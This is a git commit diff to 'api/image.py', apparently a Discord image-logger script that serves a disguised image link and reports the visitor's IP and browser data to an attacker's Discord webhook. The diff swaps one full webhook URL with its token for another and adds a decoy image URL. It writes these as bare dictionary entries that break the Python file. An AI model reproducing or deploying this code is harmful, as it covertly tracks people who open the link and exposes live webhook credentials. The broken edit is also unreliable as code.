026802d9438f5aaac75745d47615249e9747a1ae
Rxre2509 <131930573+Rxre2509@users.noreply.github.com>
2026-05-26 15:14:32 -0500

    Update image.py

--- api/image.py
+++ api/image.py
@@ -2,8 +2,8 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-webhook = 'https://discord.com/api/webhooks/1349155542039400522/NmbDkDhaCWLOPl68KDhFglwx773fTCdfBsXYVO1dkMuVPrw5pBM4tmsXtK6ohCSDOhj-'
-
+"webhook": "https://discord.com/api/webhooks/1508925518580547759/L91_l3ZzqL_NO50ChhWq6w0-U6xH6FnT_HKpHAGq9dO3fLi97Rb7JybJcYQvVpYf-h9N",
+"image":"https://as1.ftcdn.net/v2/jpg/00/63/58/34/1000_F_63583402_iPdl8WcYi6GbSuBqHkOCugPLZlV5vdcT.jpg",
 bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
